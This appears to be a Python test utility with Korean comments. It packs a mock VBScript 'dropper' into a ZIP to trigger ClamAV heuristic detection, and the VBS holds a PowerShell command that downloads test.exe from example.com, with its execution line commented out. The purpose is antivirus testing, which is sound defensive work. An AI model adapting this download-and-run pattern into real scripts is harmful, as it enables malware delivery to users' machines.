import zipfile
import os

# ClamAV 및 다른 백신들의 '휴리스틱(Heuristic)' 탐지 엔진을 자극하기 위한 VBScript 문자열입니다.
# 1. 탐지 이유: 특정 객체(WScript.Shell)를 생성하고 원격 파일을 다운로드하거나 
#    실행하는 패턴(bitsadmin, mshta, powershell 등)은 전형적인 '드롭퍼(Dropper)' 형태입니다.
# 2. 휴리스틱 탐지: 특정 바이러스 서명이 없더라도, 코드의 '행위'나 '패턴'이 
#    악성코드와 유사할 때 'Heuristics.Suspicious'와 같은 이름으로 탐지됩니다.
VBS_SUSPICIOUS_CONTENT = r'''
' ClamAV Heuristic Detection Test Script (VBS Downloader Mock)
' 이 코드는 실제 감염을 시키지는 않지만, 백신이 "의심스러운 스크립트"로 분류하도록 유도합니다.

Set objShell = CreateObject("WScript.Shell")
strCommand = "powershell -Command ""(New-Object Net.WebClient).DownloadFile('http://example.com/test.exe', 'test.exe')"""

' 백신은 아래와 같은 외부 프로세스 호출 및 다운로드 시도를 감시합니다.
' objShell.Run strCommand, 0, True
'''

def create_clamav_vbs_test_zip(zip_filepath, inner_filename="downloader_mock.vbs"):
    """
    의심스러운 VBS 패턴을 포함한 이진 파일 내용을 압축 파일 내부에 기록합니다.
    디스크에 개별 VBS 파일을 만들지 않고 바로 메모리에서 ZIP 내부로 입력하는 방식을 통해
    Windows 환경의 실시간 삭제 간섭을 방지합니다.
    """
    try:
        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # writestr을 이용하여 메모리 내 문자열을 압축 파일에 직접 서술 (UTF-8 인코딩)
            zipf.writestr(inner_filename, VBS_SUSPICIOUS_CONTENT.encode('utf-8'))
        print(f"성공적으로 생성됨: {zip_filepath}")
        print(f"내부 포함 파일: {inner_filename}")
    except Exception as e:
        print(f"파일 생성 중 오류 발생: {e}")

if __name__ == "__main__":
    current_dir = os.path.dirname(os.path.abspath(__file__))
    target_zip = os.path.join(current_dir, "clamav_vbs_test.zip")
    
    # 실행
    create_clamav_vbs_test_zip(target_zip, "downloader_mock.vbs")
